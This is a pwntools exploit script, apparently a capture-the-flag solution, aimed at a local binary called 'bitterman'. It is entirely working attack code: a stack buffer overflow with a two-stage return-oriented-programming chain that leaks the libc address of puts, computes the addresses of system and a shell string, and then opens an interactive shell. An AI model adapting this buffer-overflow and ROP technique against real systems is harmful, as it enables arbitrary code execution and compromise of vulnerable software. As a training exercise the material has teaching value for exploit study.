from pwn import *
#context(terminal = ['tmux','new-window'])
p = process('./bitterman')
#p = gdb.debug('./bitterman','b main')

context(os='Linux',arch='amd64')
#context.log_level = 'DEBUG'

#stage 1
plt_main = p64(0x4006ec)
plt_put = p64(0x400520) # Procedure Linkage Table
got_put = p64(0x600c50) # global offset table
#in 64 bit we don't put args in stack ,we put into registers , so we need pop_rdi

pop_rdi = p64(0x400853) # it is going to pop from rdi stack and return

junk = "A"*152

payload = junk.encode() + pop_rdi + got_put + plt_put +plt_main

"""> What's your name?
udsa
Hi, udsa

> Please input the length of your message:
10
> Please enter your text:
asds
> Thanks!"""

p.recvuntil('name?')
p.sendline('0xyash')
p.recvuntil('message:')
p.sendline('1024')
p.recvuntil('text:')
p.sendline(payload)
p.recvuntil('Thanks!')
leaked = p.recv()[:8].strip().ljust(8, b"\x00")
log.success("Leaked Address = " +str(leaked))
leaked_puts = u64(leaked)

#stage 2 
libc_puts = 0x74040
libc_sys = 0x46ff0
libc_bash = 0x183cee
pop_rdi = p64(0x400853)


offset = leaked_puts - libc_puts
sys = p64(offset + libc_sys)
sh = p64(offset + libc_bash)
payload = junk.encode() + pop_rdi + sh +sys
p.sendline('0xyash')
p.recvuntil('message:')
p.sendline('1024')
p.recvuntil('text:')
p.sendline(payload)
p.recvuntil('Thanks!')


#input()
p.interactive()



